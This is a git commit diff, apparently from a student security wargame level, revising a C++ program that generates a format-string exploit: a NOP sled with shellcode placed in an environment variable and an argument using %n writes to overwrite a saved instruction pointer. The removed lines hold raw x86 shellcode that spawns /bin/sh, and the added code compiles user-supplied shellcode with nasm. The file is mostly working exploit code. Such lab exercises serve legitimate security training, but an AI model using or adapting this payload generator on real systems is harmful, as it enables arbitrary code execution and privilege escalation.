14990f81e17994fcd86ce9e43bae3f0a5332c07d
krambo <krambono@student.le-101.fr>
2020-12-29 14:04:07 +0100

    level05

--- level05/Ressources/generator.cpp
+++ level05/Ressources/generator.cpp
@@ -4,16 +4,33 @@
 
 typedef unsigned int uint;
 
-uint eip = 0xffffd3fc + 0x10;
+std::string raw_shellcode;
 
-std::string raw_shellcode = "\x31\xc0\x31\xdb\xb0\x06\xcd\x80"
-							"\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80"
-							"\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80";
+int compile(const char *asm_path)
+{
+	std::string command = "nasm -f bin -o shellcode_light ";
+	command += asm_path;
+	if (std::system(command.c_str()) != 0)
+	{
+		std::cerr << "Failed to compile shellcode" << std::endl;
+		return 0;
+	}
+	return 1;
+}
+
+std::string getCompiledAsm()
+{
+	std::ifstream file("shellcode_light");
+	std::string shellcode;
+
+	std::getline(file, shellcode);
+	return shellcode;
+}
 
 int writeShellCode1()
 {
 	std::ofstream file("args/env_var");
-	std::string shellcode = raw_shellcode;
+	std::string shellcode = raw_shellcode.empty() ? getCompiledAsm() : raw_shellcode;
 
 	for (uint i = 0; i < 300; i++)
 		file << (char)0x90;
@@ -27,30 +44,40 @@ void writeShellCode2()
 {
 	std::ofstream file("args/arg");
 
-	uint addr_jmp = 0xffffd75e; // jump in env var
-	addr_jmp -= 8;
-	uint part1 = (addr_jmp & 0xffff0000) >> (2 * 8);
-	uint part2 = addr_jmp & 0x0000ffff;
+	uint eip = 0xffffd3dc + 0x10;
+	uint eip_high = eip + 2;
 
-	printf("%x, %x\n", part1, part2);
+	uint addr_jmp = 0xffffd746 - 8; // jump in env var
+	uint high_bytes = (addr_jmp & 0xffff0000) >> (2 * 8);
+	uint low_bytes = addr_jmp & 0x0000ffff;
 
-	uint eip2 = eip + 2;
 	for (int i = 0; i < 4; i++)
 		file << ((char *)(&eip))[i];
 	for (int i = 0; i < 4; i++)
-		file << ((char *)(&eip2))[i];
+		file << ((char *)(&eip_high))[i];
 
-	file << "%" << std::to_string(part2) << "x";
-	file << "%10$.n";
-	file << "%" << std::to_string(part1 - part2 - 8) << "x";
-	file << "%11$.n";
+	file << "%" << std::to_string(low_bytes) << "x";
+	file << "%10$n";
+	file << "%" << std::to_string(high_bytes - low_bytes - 8) << "x";
+	file << "%11$n";
 
 	file.close();
 }
 
 int main(int argc, char const *argv[])
 {
-	writeShellCode1();
+	if (raw_shellcode.empty())
+	{
+		if (argc != 2)
+		{
+			std::cout << "Usage: " << argv[0] << " <shellcode.s>" << std::endl;
+			return 1;
+		}
+		if (!compile(argv[1]))
+			return 1;
+	}
+	if (!writeShellCode1())
+		return 1;
 	writeShellCode2();
 	return 0;
 }
